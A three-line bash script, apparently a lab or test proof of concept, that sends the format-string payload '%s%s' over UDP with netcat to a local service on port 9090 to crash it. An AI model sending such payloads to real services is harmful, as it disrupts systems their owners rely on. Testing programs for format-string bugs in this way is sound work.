#!/bin/bash
echo "Crashing the program by printing %s%s"
echo %s%s | nc -u 127.0.0.1 9090

